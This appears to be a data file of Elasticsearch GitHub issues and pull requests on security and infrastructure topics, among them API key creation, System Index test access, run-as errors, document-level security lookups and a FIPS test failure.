I've renamed the issue and switched it from `bug` to `enhancement` because we now explicitly prevent derived API keys from having any privileges (that is, what was previously classified as a bug is now the explicit behaviour).

That doesn't change anything regarding our priorities, or our interest in resolving this.   Just wasted a couple of hours on this until I found this issue, so yes being documented would be nice.

My use case would be creating API keys for filebeat clients without having to do it manually via the kibana gui. If I could create API keys using an API key then i could use curl.

How do huge deployments manage this - surely someone isn't manually creating API keys for thousands of filebeat clients, or do people use a single cleartext username/password like its 1992?> do people use a single cleartext username/password

@sej7278 
Can you explain in a little more detail why you prefer API Keys for this task than username/password?
In practice there's not of difference in the authentication process for users and API keys. In both cases you have a credential that should remain secret which is encoded into a HTTP header and sent as part of the Rest request, ideally over SSL.

The attack surface of those two things is pretty much identical. As it currently stands, users actually give you a little bit more because we support a wider variety of authentication methods (e.g. ""PKI"" using client certificates) and backends (LDAP).

The value proposition for API Keys is that users can create them without needing to have access to manage security for the whole cluster, and they are limited to having that user's privileges (or less). But with respect to _credentials on the wire_, they intentionally have a _very_ similar model to users.
 @tvernum I just hadn't thought of using basic auth (over tls) with curl, i've got a script that can now create api keys for filebeat clients using curl - albeit with a username/password in plaintext in the script.

if i could replace the user/pwd with an api key, i could at least limit its use to a few minutes whilst the ""create 1000 api keys"" job runs. with a user/pwd i'd have to change the password and inform people etc. its more about the attack window than the attack surface.

as for client certificates, i can't see people wanting to manage thousands of them annually (and role mappings etc) although combined with an internal CA cert its obviously the best method. LDAP could work although not sure what extra that offers over just editing the user in kibana or whatever.

i was specifically referring to all filebeat clients using a single user/pwd being a bad idea though, which until i wrote my script, seemed like the only way to go. now i have a way to mass-produce api keys, although i'm still not sure if that's much better than (multiple) usernames/passwords.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,703071334,"Stop accessing System Indices directly in REST tests","As part of formalizing System Indices in Elasticsearch (https://github.com/elastic/elasticsearch/issues/50251), we will be restricting access to System Indices via the REST interface, except by means of purpose-built APIs. For example, accessing `.watches` directly will not be allowed - all interaction with the `.watches` index via the REST API should use the purpose-built [Watcher APIs](https://www.elastic.co/guide/en/elasticsearch/reference/current/watcher-api.html).

If it is necessary to access System Indices via the REST API today, an API should be added to fulfill that need rather than using generic APIs to do so.

There are a number of places in our REST tests which access System Indices directly. These tests will be modified by https://github.com/elastic/elasticsearch/pull/60945 to avoid failures by consuming the deprecation warning as necessary, but that is not a long-term solution. The tests below should be evaluated to determine if there is a necessary API that is currently missing, and if so, add that API and convert the test to use it. If not, we should determine an alternate method for testing the functionality which does not directly access System Indices via the REST API.

Tests/test-related methods which currently access System Indices directly via the REST API:
## Test Framework
- [ ] `ESRestTestCase.wipeAllIndices` - @williamrandolph 

## Tasks
- [ ] `delete_by_query/80_slices.yml - Multiple slices with wait_for_completion=false`
- [ ] `delete_by_query/80_slices.yml - Multiple slices with rethrottle`
- [ ] `reindex/80_slices.yml - Multiple slices with wait_for_completion=false`
- [ ] `reindex/80_slices.yml - Multiple slices with rethrottle`
- [ ] `update_by_query/80_slices.yml - Multiple slices with wait_for_completion=false`
- [ ] `update_by_query/80_slices.yml - Multiple slices with rethrottle`
- [ ] `rolling_upgrade` .. `upgraded_cluster/10_basic.yml - Find a task result record from the old cluster`

## Transforms
- [ ] `TransformUsageIT.testUsage`
- [ ] `TransformConfigurationIndexIT.testDeleteConfigurationLeftOver`
- [ ] `TranformInternalIndexIT.testUpdateDeletesOldTransformConfig`
- [ ] `TransformRestTestCase.wipeTransforms`
- [ ] `TranformRobustnessIT.beEvilAndDeleteTheTransformIndex`
- [ ] `rolling-upgrade` .. `upgraded_cluster/80_transform_jobs_crud.yml - Test index mappings for latest internal index and audit index`

## ML
- [ ] `MlMappingsUpgradeIT.assertUpgradedConfigMappings`
- [ ] `IndexMappingTemplateAsserter.assertMlMappingsMatchTemplates`
- [ ] `InferenceIngestIT.cleanUpData`
- [ ] `ml/calendar_crud.yml - Test delete calendar deletes events`
- [ ] `ml/custom_all_field.yml - Test wildcard job id`
- [x] `ml/filter_crud.yml - setup` (#63111)
- [x] `ml/filter_crud.yml - Test get all filter given index exists but no mapping for filter_id` (#63111)
- [ ] `ml/inference_stats_crud.yml - setup`
- [ ] `ml/inference_crud.yml - setup`
- [ ] `ml/index_layout.yml - Test force close does not create state`
- [ ] `ml/index_layout.yml - Test CRUD on two jobs in shared index`

## Watcher
- [x] `WatcherRestTestCase.stopWatcher` #65835
- [x] `WatcherYamlSuiteTestCase.stopWatcher` #65835
- [x] `MonitoringWithWatcherIT.cleanExporters` #65835
- [x] `MonitoringWithWatcherIT.assertTotalWatchCount` #64582
- [x] `FullClusterRestartIT.testWatcher` #65884
- [x] `watcher/activate_watch/10_basic.yml - Test activate watch api` #64199
- [x] `watcher/ack_watch/10_basic.yml - Test ack watch api` #64199
- [x] `watcher/delete_watch/10_basic.yml - Test delete watch api` #64199
- [x] `watcher/get_watch/10_basic.yml - Test get watch api` #64199
- [x] `watcher/put_watch/80_put_get_watch_with_passwords.yml - Test putting a watch with a redacted password with old seq no returns an error` #64199
- [x] `managing_watches.asciidoc` #65835

## Security
- [ ] `FullClusterRestartIT.testSecurityNativeRealm`
- [ ] `users/10_basic.yml - Test put user with password hash`
","Pinging @elastic/es-core-infra (:Core/Infra/Build)Pinging @elastic/es-security (:Security/Security)Pinging @elastic/es-core-features (:Core/Features/Watcher)Pinging @elastic/ml-core (:ml)Pinging @elastic/es-distributed (:Distributed/Task Management)Pinging @elastic/ml-core (:ml/Transform)As for some of the transform tests: Some tests challenge the robustness of the system (e.g. `beEvilAndDeleteTheTransformIndex`), another verifies mappings. I am not arguing that all transform tests should be kept as they are, but at least some have a good reason(the others should avoid using system indices). 

It would be good to have a way to mark single tests as valid case, similar to `@SuppressWarnings` (that excludes yaml tests, I think that's fine). cc @elastic/clients-team this will affect us as well. `expand_wildcards` won't be allowed to touch system indices anymore either so a new dedicated API to delete all system API's needs to be introduced so we can reliably run yaml rest spec setup/teardown.> Some tests challenge the robustness of the system (e.g. beEvilAndDeleteTheTransformIndex)

Validating the behavior of the system in the event of a user doing something they shouldn't like this is a valid use case for either using this parameter and/or ignoring deprecation warnings as necessary for as long as this behavior is allowed. However, our intent is to disable access to System Indices via REST entirely, so these tests would no longer be valid at that time (because the user can no longer be evil and delete the transform index). In that case, we should note that the test case can be removed when it is no longer possible to access System Indices via REST.

> another verifies mappings

These cases still run into the same issue - eventually, it will not be possible to access these indices via the general-purpose index APIs. For these, I can think of a few options - we could either move the mapping verification into Elasticsearch and expose it as an endpoint (e.g. `POST _ml/verify_index_mappings`), or add a special purpose API that returns the mappings of these indices.> so we can reliably run yaml rest spec setup/teardown.

This raises a very important question.  At the moment all indices are removed in between YAML tests.  This is done in the test client.  What is the plan for system indices in between YAML tests?  Will they eventually _not_ be cleaned up in between YAML tests like user-visible indices?  Or will there be a special API to delete all system indices in between YAML tests?  Basically, the problem Martijn outlined doesn't just affect the language clients maintained by the clients team but also the test harness used within the Elasticsearch repo, and the solution should be the same for both.System Indices will be wiped between REST tests (both YAML and Java) at the same point they are today. Exactly how we're going to implement this when the `allow_system_index_access` flag is removed isn't fully nailed down yet, but it's likely to take the form of a special API to delete all system indices, sort of a ""factory reset""-type API. In any event, we (the team implementing System Indices functionality, see assignees of https://github.com/elastic/elasticsearch/issues/50251) will handle any API changes necessary to Elasticsearch and the test infrastructure in the Elasticsearch repo to clean up System Indices as they are today and ensure the same mechanism is exposed for the Clients team.

Reworking the tests to *not* wipe system indices between tests would be a large undertaking, and has not been something we've even seriously considered thus far.I think a ""factory reset"" API should be added as a *must* to the meta issue *before* eventually locking the access to system indices. We see users doing a manual reset by deleting the indices very often in ML. A challenge to that: For a factory reset any jobs(ml/transform/rollup/...) must be stopped. You also might not want to reset everything but only parts. I think it makes sense to have a reset per feature and a global reset that calls all of them.I like the idea of a ""factory reset"" API.  That would make our cleanup in between tests as simple as ""call the factory reset API"".  At the moment we have lots of bits of cleanup code that are written differently for internal cluster tests, REST tests and integration tests that use the node client.  If that logic was moved into Elasticsearch server-side then the client-side cleanup code would be trivial.  This would also help the language clients in the long run (after the initial pain of switching over).  At the moment they have to try to mimic the various bits of cleanup code we run in every language.

> A challenge to that: For a factory reset any jobs(ml/transform/rollup/...) must be stopped.

Yes agreed.

To properly ""factory reset"" would involve more than simply deleting all the system indices.  In fact, having a documented API that _just_ deletes all system indices could _cause_ problems.  For ML if system indices are deleted before persistent tasks are cancelled then those persistent tasks become hard to deal with.  Also, ML has a mix of hidden and system indices, and deleting the system indices while leaving the hidden indices behind will cause weird effects if ML is used again afterwards.

So a factory reset would look something like:

1. Cancel all persistent tasks
2. Wait for all pending tasks to complete (so the side effects of cancelling the persistent tasks don't interfere with the index deletion)
3. Delete all hidden indices whose names begin with `.`
4. Delete all system indices@hendrikmuhs @droberts195 I've opened https://github.com/elastic/elasticsearch/issues/62778 to cover that issue, and linked it from the `ESRestTestCase.wipeAllIndices` point above. Let's continue discussion over there. I'll also add this as a topic in this week's System Indices sync.FYI, I'm removing the Delivery team label here since the focus here is on specific test implementations not testing infrastructure.",no,">test,Meta,:Distributed/Task Management,:ml,:Security/Security,:Data Management/Watcher,:ml/Transform,Team:Data Management,Team:Distributed,Team:Security,"
elastic/elasticsearch,991793146,"Fix Large Shard Count Scalability Issues","This meta issue tracks known issues with scaling clusters to large numbers of shards.

- Security
  - [ ] https://github.com/elastic/elasticsearch/issues/67987
     - [x] https://github.com/elastic/elasticsearch/issues/79632

- General
  - [ ] https://github.com/elastic/elasticsearch/issues/51992
  - [ ] https://github.com/elastic/elasticsearch/issues/87555
  - [x] https://github.com/elastic/elasticsearch/pull/77546
  - [ ] https://github.com/elastic/elasticsearch/issues/79563
  - [x] https://github.com/elastic/elasticsearch/pull/79793
  - [x] https://github.com/elastic/elasticsearch/issues/79906
  - [x] https://github.com/elastic/elasticsearch/pull/80064
  - [ ] https://github.com/elastic/elasticsearch/issues/80694
  - [ ] https://github.com/elastic/elasticsearch/issues/81626
  - [x] https://github.com/elastic/elasticsearch/issues/81627
  - [x] https://github.com/elastic/elasticsearch/issues/81628
  - [ ] https://github.com/elastic/elasticsearch/issues/81846
  - [x] https://github.com/elastic/elasticsearch/issues/81880
  - [x] https://github.com/elastic/elasticsearch/issues/82337
  - [x] https://github.com/elastic/elasticsearch/issues/82342
  - [x] https://github.com/elastic/elasticsearch/pull/82608
  - [x] https://github.com/elastic/elasticsearch/pull/82227
  - [x] https://github.com/elastic/elasticsearch/pull/82830
  - [ ] https://github.com/elastic/elasticsearch/issues/83049
  - [ ] https://github.com/elastic/elasticsearch/issues/83203
  - [x] https://github.com/elastic/elasticsearch/issues/83204 -> #85380
  - [x] https://github.com/elastic/elasticsearch/issues/85839
  - [x] https://github.com/elastic/elasticsearch/issues/86639
  - [x] https://github.com/elastic/elasticsearch/issues/87681
  - [ ] https://github.com/elastic/elasticsearch/issues/90631

- Snapshots + SLM
  - [x] https://github.com/elastic/elasticsearch/pull/80942 
  - [ ] https://github.com/elastic/elasticsearch/issues/82824
  - [ ] https://github.com/elastic/elasticsearch/issues/82853
  - [x] https://github.com/elastic/elasticsearch/issues/82937
  - [x] https://github.com/elastic/elasticsearch/pull/88707
  - [x] https://github.com/elastic/elasticsearch/issues/88732
  - [ ] https://github.com/elastic/elasticsearch/issues/89163
  - [ ] https://github.com/elastic/elasticsearch/issues/89952
 
- Metrics
  - [x] https://github.com/elastic/elasticsearch/issues/80428 

- ILM + Allocation
  - [x] https://github.com/elastic/elasticsearch/pull/78547
  - [x] #78235 
  - [x] https://github.com/elastic/elasticsearch/issues/78246
  - [x] #78075 
  - [x] #77965 
  - [x] https://github.com/elastic/elasticsearch/pull/77855
  - [x] https://github.com/elastic/elasticsearch/pull/77863 
  - [x] https://github.com/elastic/elasticsearch/pull/78742
  - [x] https://github.com/elastic/elasticsearch/pull/78668
  - [x] https://github.com/elastic/elasticsearch/pull/78672
  - [x] https://github.com/elastic/elasticsearch/pull/78609
  - [x] https://github.com/elastic/elasticsearch/pull/78745
  - [x] https://github.com/elastic/elasticsearch/pull/78813
  - [ ] https://github.com/elastic/elasticsearch/issues/78892
     - [x] https://github.com/elastic/elasticsearch/pull/80493
  - [x] https://github.com/elastic/elasticsearch/issues/77888
  - [x] https://github.com/elastic/elasticsearch/pull/78931
  - [x] https://github.com/elastic/elasticsearch/pull/78969
  - [x] https://github.com/elastic/elasticsearch/issues/78980
  - [x] https://github.com/elastic/elasticsearch/issues/79782
  - [x] https://github.com/elastic/elasticsearch/issues/79866
  - [x] https://github.com/elastic/elasticsearch/pull/79860
  - [x] https://github.com/elastic/elasticsearch/pull/79941
  -   [x] https://github.com/elastic/elasticsearch/pull/80179
  - [ ] https://github.com/elastic/elasticsearch/issues/80407
  - [x] https://github.com/elastic/elasticsearch/issues/81880
  - [x] https://github.com/elastic/elasticsearch/pull/82251
  - [x] https://github.com/elastic/elasticsearch/issues/82708
  - [x] https://github.com/elastic/elasticsearch/pull/83092
  - [x] https://github.com/elastic/elasticsearch/pull/83241
  - [x] https://github.com/elastic/elasticsearch/pull/83340
  - [x] https://github.com/elastic/elasticsearch/issues/83582
  - [x] https://github.com/elastic/elasticsearch/pull/84034
  - [ ] https://github.com/elastic/elasticsearch/issues/89924
 
- Search 
  - [x] https://github.com/elastic/elasticsearch/issues/74648
  - [x] https://github.com/elastic/elasticsearch/issues/78164
  - [x] https://github.com/elastic/elasticsearch/pull/76405
  - [x] https://github.com/elastic/elasticsearch/pull/77131
  - [x] https://github.com/elastic/elasticsearch/pull/77201
  - [x] https://github.com/elastic/elasticsearch/pull/77251
  - [x] https://github.com/elastic/elasticsearch/issues/78314
  - [x] https://github.com/elastic/elasticsearch/pull/78508
  - [x] https://github.com/elastic/elasticsearch/issues/82879
  - [ ] https://github.com/elastic/elasticsearch/issues/89309
  - [ ] https://github.com/elastic/elasticsearch/issues/90622
- Network
  - [x] https://github.com/elastic/elasticsearch/issues/82245
  - [ ] https://github.com/elastic/elasticsearch/issues/79560
  - [ ] https://github.com/elastic/elasticsearch/pull/83846
  - [ ] https://github.com/elastic/elasticsearch/issues/84876
  - [ ] https://github.com/elastic/elasticsearch/issues/84887","Pinging @elastic/es-distributed (Team:Distributed)Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-data-management (Team:Data Management)",no,">bug,release highlight,Meta,:Distributed/Distributed,:Security/Authorization,:Data Management/Other,Team:Data Management,Team:Distributed,Team:Security,"
elastic/elasticsearch,1173794955,"Issue #50932 PKCS#12 format","# This document gives the technical details of our contribution to the issue  \#50932

## Summary of issue \#50932

The purpose of this [issue \#50932](https://github.com/elastic/elasticsearch/issues/50932)
is to change the format of the Kibana certificate from PEM to PKCS12.

1- [HttpCommand_certificate](https://github.com/elastic/elasticsearch/blob/814f7f9f52cb8c05db6465b9bfc818ea5d76c575/x-pack/plugin/security/cli/src/main/java/org/elasticsearch/xpack/security/cli/HttpCertificateCommand.java#L415)

# Details
## Code
In order to change the format of the certificate we changed this [file]
(https://github.com/elastic/elasticsearch/blob/814f7f9f52cb8c05db6465b9bfc818ea5d76c575/x-pack/plugin/security/cli/src/main/java/org/elasticsearch/xpack/security/cli/HttpCertificateCommand.java#L415)

We modified the function writeKibanaInfo() by adding this part : 

```java 
try {
            writeTextFile(zip, dirName + ""/README.txt"", KIBANA_README, substitutions);
            if (ca != null) {
                final KeyStore pkcs12 = KeyStore.getInstance(""PKCS12"");
                pkcs12.load(null);
                pkcs12.setKeyEntry(""elasticsearch-ca"", ca.certAndKey.key, ca.password, new Certificate[] { ca.certAndKey.cert });
                try (ZipEntryStream entry = new ZipEntryStream(zip, dirName + ""/elasticsearch-ca.p12"")) {
                    pkcs12.store(entry, ca.password);
                }

            }
            writeTextFile(zip, dirName + ""/"" + ymlFile, KIBANA_YML, substitutions);
        } catch (KeyStoreException | IOException | CertificateException | NoSuchAlgorithmException e) {
            throw new ElasticsearchException(""Failed to write Kibana details ZIP file"", e);
        }
```

Now when the certificate of Kibana is generated it's automatically stored 
in PKCS#12 format instead of PEM


## Choices made in order to improve the security of the project
PKCS 12 is a format which allows to store the Key and the certificate in 
the same file in order to make it more pratical to manipulate.
","@GregoireDelahaye please enable the option ""Allow edits and access to secrets by maintainers"" on your PR. For more information, [see the documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/allowing-changes-to-a-pull-request-branch-created-from-a-fork).Hi @nik9000 ,
This is the first time that we contribute to ElasticSearch, what we need to do in order to pass all tests?
ThanksPinging @elastic/es-security (Team:Security)Hi @GregoireDelahaye, sorry that you spent time on this PR unnecessarily.

I don't think we want to make this change

1. PEM is a more commonly used format for CAs than PKCS#12, and I think it is better to continue providing the CA in PEM
2. This change also includes the CA key in the PKCS#12 file, which we definitely don't want to do
3. In the end, it's a change for no real value and that requires changing documentation and sample configuration without any compelling reason to do so.
",yes,":Security/TLS,Team:Security,external-contributor,v8.6.0,"
elastic/elasticsearch,1066943078,"Run as / impersonate should give better error when used in conjunction with an Active Directory realm","**Elasticsearch version** (`bin/elasticsearch --version`): 7.15.0

**Plugins installed**: [none]

**JVM version** (`java -version`): bundled

**OS version** (`uname -a` if on a Unix-like system): CentOS 7

**Description of the problem including expected versus actual behavior**:

The error displayed (under Step 3), is not helpful. The [Active Directory Realm config](https://www.elastic.co/guide/en/elasticsearch/reference/current/active-directory-realm.html) states that

> The use of a bind user enables the run as feature to be used with the Active Directory realm and the ability to maintain a set of pooled connections to Active Directory. These pooled connection reduce the number of resources that must be created and destroyed with every user authentication.

The error message should reflect that statement.

**Steps to reproduce**:

 1. Configure an Active Directory Realm without a bind_dn
 2. Run the impersonate API against the `_security/_authenticate` API. using a curl similar to `curl -H ""es-security-runas-user: active-directory-username"" -u elastic .../_security/_authenticate`
 3. Now you should see this error
```
""action [cluster:admin/xpack/security/user/authenticate] is unauthorized for user [elastic] run as [active-directory-username] with roles [], this action is granted by the cluster privileges [manage_security,all]""
```

1. Add the bind_dn
2. Run the same command as above
3. Now you see the groups, roles and everything listed.","Pinging @elastic/es-security (Team:Security)Thanks for reporting. Yes we need to improve error messages around failures due to run-as. This issue #72904 is along the same line that error message of run-as failure does not tell you the actual problem. What I suspect we ought to do is add a ""failed with error message"" to realm lookup like we have with realm authentication.  
Realms that cannot support lookup (particularly if that is due to specific config) can then add a message of ""realm [x] cannot perform lookup of users because ...""  
Then, when the AuthcService fails to lookup a user it can print out the set of messages (just like when authc fails).
",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,321796872,"Add expire-after-write to roles cache","The current [role store cache](https://github.com/elastic/elasticsearch/blob/72052c7/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/store/CompositeRolesStore.java#L104-L109) has no automatic expiry except if full (which will rarely happen).

However that means that any inconsistencies that somehow find their way into the cache (through bugs, poorly timed node failures, etc) will persist until either 
1. the cache is manually cleared
2. the node is restarted

it would be preferable to add a eviction time on this cache, even if it is measured in hours.","Pinging @elastic/es-securityRegarding _poorly timed node failures_:

We execute an acction to clear entries from the cache after they are updated in the native store
[(source)](https://github.com/elastic/elasticsearch/blob/72052c717a55ab189d8d8bc7029dc1c5d13aadb5/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/store/NativeRolesStore.java#L196) but if the update occurs, and then the node fails, it's possible that the index will be updated, but the cache will not be cleared on some/all other nodes.
When that failed node is restarted (or another node is brought online) it will see the new role definition from the index but other nodes will still have the cached definition, _indefinitely_.

The client that sent the failed update ought to retry since it never got a successful response, but we cannot guarantee that will happen (e.g. perhaps the client failed at the same time, due to the same power outage)
I like the idea to expire after write, just for my understanding: When the index gets updated on the other nodes, do we get any event to a listener that allows us to monitor security index changes and then do invalidation of cache? Eventually, index on the other node will be updated, I do see [IndexOutOfDateChange](https://github.com/elastic/elasticsearch/blob/72052c7/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/store/CompositeRolesStore.java#L333) not sure if it is the same thing, would this handle the scenario?@bizybot 
The `IndexOutOfDateChange` (which is being refactored by #30466, but the concept will still exist) is only dealing with index metadata. It captures the internal version marker of the index, to assist in upgrading etc. It does not change when the data inside the index changes.

At the moment, because we _theoretically_ (*) replicate the security index to every node, each node knows when the index gets updated, but we don't have listeners for such events.

And:
1. It's not actually true that every node has a copy of the security index. If the cluster has multiple nodes per host, and is configured to prevent replicas being allocated to nodes on the same host (which they _should_ do), then the security index will only be replicated to 1 node per host. See https://github.com/elastic/elasticsearch/issues/29933
2. We may change our replication strategy in the future to _not_ replicate security to every node.
3. All of this could change if we introduce and use an internal blog store instead of a standard index (which has been proposed, but I don't believe anyone has done any work on that)
",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317447254,"Disable/Enable repository types based on user role","*Original comment by @dadoonet:*

This come from this thread https://discuss.elastic.co/t/how-to-disable-filesystem-url-snapshots-in-2-x/44776 and this related feature request: https://github.com/elastic/elasticsearch/issues/17181

I wonder if we can allow / disallow users using some of the repository type based on their roles...
We can't do that by protecting some URLs because the repository type is set within the body.

``` sh
PUT /_snapshot/my_fs
{
    ""type"": ""fs"",
    ""settings"": {
        ""location"": ""my_backup""
    }
}

PUT /_snapshot/s3_repository
{
  ""type"": ""s3"",
  ""settings"": {
    ""bucket"": ""my_s3_bucket"",
    ""region"": ""eu-west-1""
  }
}
```

In such a case, I'd like to disable usage of local FS but allow using S3.

Is this something we would like to support in Shield or do we prefer adding a global option as proposed in https://github.com/elastic/elasticsearch/issues/17181?


","*Original comment by @jaymode:*

This is probably something we could do once we have the concept of object level security implemented and repositories could be considered an object that individual permissions could be assigned to
",no,">feature,:Security/Authorization,Team:Security,"
elastic/elasticsearch,661578817,"Enabling run_as to specify any user in a role","At the moment, you can specify` run_as` to allow impersonation of specific users. It would be useful if this could may to something more flexible like a role. That way, as users change, there is no requirement to continually update this setting.
","Pinging @elastic/es-security (:Security/Authorization)We discussed this & the general view is:

1. This feels more suited to a group concept than roles. We don't have groups, but it seems like the desire is to be able to link the run-as privilege to a collection of users, rather than a role. We thought about groups in the past, particularly for things like sharing visualizations in Kibana, so maybe something will happen there are some point.

2. Depending on what realms exist, and how they are set up, it might be possible to do something with realm names or user metadata. That is, the run-as privilege could specify that you can run-as all users from the ""corporate-ldap"" realm, or all users in the ""*,ou=users,..."" LDAP tree.

3. For roles, it seems like there would be as much need to exclude ""roles"" (e.g. not admins, not superuser) etc, as there is to permit roles. If we did something here, we would need to think through what we would/wouldn't want to support and not just add ""roles"".

The conclusion was _Maybe...?_
Some sort of finer grained control around run-as privileges seems reasonable, but we're not sure that ""mast-have-this-role"" is the best way to do that.
Yes, Role was not a key component. Just the only grouping is users that
seemed available.
I think in practice it would be something like an LDAP group.

On Fri, 31 Jul 2020, 05:15 Tim Vernum, <notifications@github.com> wrote:

> We discussed this & the general view is:
>
>    1.
>
>    This feels more suited to a group concept than roles. We don't have
>    groups, but it seems like the desire is to be able to link the run-as
>    privilege to a collection of users, rather than a role. We thought about
>    groups in the past, particularly for things like sharing visualizations in
>    Kibana, so maybe something will happen there are some point.
>    2.
>
>    Depending on what realms exist, and how they are set up, it might be
>    possible to do something with realm names or user metadata. That is, the
>    run-as privilege could specify that you can run-as all users from the
>    ""corporate-ldap"" realm, or all users in the ""*,ou=users,..."" LDAP tree.
>    3.
>
>    For roles, it seems like there would be as much need to exclude
>    ""roles"" (e.g. not admins, not superuser) etc, as there is to permit roles.
>    If we did something here, we would need to think through what we
>    would/wouldn't want to support and not just add ""roles"".
>
> The conclusion was *Maybe...?*
> Some sort of finer grained control around run-as privileges seems
> reasonable, but we're not sure that ""mast-have-this-role"" is the best way
> to do that.
>
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub
> <https://github.com/elastic/elasticsearch/issues/59848#issuecomment-666906971>,
> or unsubscribe
> <https://github.com/notifications/unsubscribe-auth/ABYDJMP45BAZFS3BMAJ7NETR6JAN3ANCNFSM4PCCL6AQ>
> .
>
",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,381642075,"Allow terms lookup when specifying document-level security","Right now `terms` with `lookup` is not supported when specifying document-level security. It is, however, a very powerful tool that would enable many different use cases for document level security that currently require creating a custom plugin for elasticsearch.

For example consider a user coming from an external realm (ldap, saml, ad, ...) bringing along their username and group information. Often times the systems users are actually indexing into elasticsearch use another set of roles/groups that are somehow mapped to the groups in, let's say, AD. With `terms` lookup it would then be simple to have a ""lookup index"" with documents like:

```
PUT group-mappings/_doc/AD-GROUP-1
{
  ""oracle_roles"": [""or1"", ""or2"", ""...""],
  ""sharepoint_groups"": [""spg1"", ""spg2"", ""...""]
}
```

which could be easily maintained by the user. Then, using an index template in the role they could construct a query that would, using terms lookup, fetch the groups from such index and use those groups (`""spg1""`, `""spg2""`, `""...""`) in the query against the real data index.

That way, even if the group mappings change regularly and there is a large number of them, no custom code is needed.","Pinging @elastic/es-securityi would need this feature for a similar use-case:
the user would be authenticated by an IdP (using JWT / OpenID Connect) and the data would be protected using ABAC. but the IdP is not the authorising system (since the data, incl. ABAC security, is owned by another system) and the ABAC is very fine-grained, thus it would be extremely cumbersome (probably not realistic) to replicate the access rights of the user to the IdP to then pass it in as a claim. thus it is not feasible to use the metadata from a user for ABAC.

however, with a terms lookup we can replicate the access rights of the user for the documents and the user at the same time, thus also ensuring consistency (the rights can change at runtime). we can then use the username to get his access rights (stored in one index) and compare them to the actual documents in the index he's querying. i currently do not see an alternative for this.

w/o DLS i can set up this example nicely by adding the terms lookup to my query manually. but the moment i want to define it in DLS it fails.

is there an explanation for *why* the terms lookup is currently not supported in DLS? [the documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-limitations.html) currently only states that it's not supported but gives no reason.
what would it take to add it? is there already a timeline for it?@rursprung 

> is there an explanation for why the terms lookup is currently not supported in DLS? the documentation currently only states that it's not supported but gives no reason.
what would it take to add it? is there already a timeline for it?

I believe architecturally it would be difficult to implement, unless we acknowledge a substantial performance impact.
DLS works by hooking into the logic of deleted documents, making unauthorised docs look like they've been deleted. This is implemented using a bitset mask, for each segment (in the DLS-protected index) and for each DLS query. We can hence cache the bitset for the given segment and query pair. But if the query internally refers to a second index, which can change at any time, caching using the segment and the query as a cache key becomes problematic.

Hence we either stomach the performance impact of uncached DLS, or we have to implement the cache invalidation of the DLS bitset upon modifications to the referred-to index. But there's currently no simple way to monitor indices for changes as they can sit on other nodes in the cluster and writes are not accounted centrally (we do currently have checks like that but only for internal system indices (eg `.security`), which are accessed through dedicated APIs).
",no,">feature,:Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,748919796,"[CI] SSLErrorMessageCertificateVerificationTests fails for fips","The important bit seems to be `-Dtests.fips.enabled=true`, switch to false make it pass.

**Build scan**: https://gradle-enterprise.elastic.co/s/xzikwnf4w4m6k

**Repro line**:
```
REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.ssl.SSLErrorMessageCertificateVerificationTests.testMessageForHttpClientHostnameVerificationFailure"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=el-GR \
  -Dtests.timezone=Etc/GMT-6 \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.ssl.SSLErrorMessageCertificateVerificationTests.testMessageForRestClientHostnameVerificationFailure"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=el-GR \
  -Dtests.timezone=Etc/GMT-6 \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.ssl.SSLErrorMessageCertificateVerificationTests.testMessageForHttpClientHostnameVerificationFailure"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=el-GR \
  -Dtests.timezone=Etc/GMT-6 \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.ssl.SSLErrorMessageCertificateVerificationTests.testMessageForRestClientHostnameVerificationFailure"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=el-GR \
  -Dtests.timezone=Etc/GMT-6 \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testTcpHandshake"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testAcceptedChannelCount"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

REPRODUCE WITH: ./gradlew ':x-pack:plugin:security:test' --tests ""org.elasticsearch.xpack.security.transport.netty4.SimpleSecurityNetty4ServerTransportTests.testConcurrentSendRespondAndDisconnect"" \
  -Dtests.seed=AD420F801CD295C7 \
  -Dtests.security.manager=true \
  -Dtests.locale=sr-ME \
  -Dtests.timezone=Africa/Bamako \
  -Druntime.java=8 \
  -Dtests.fips.enabled=true

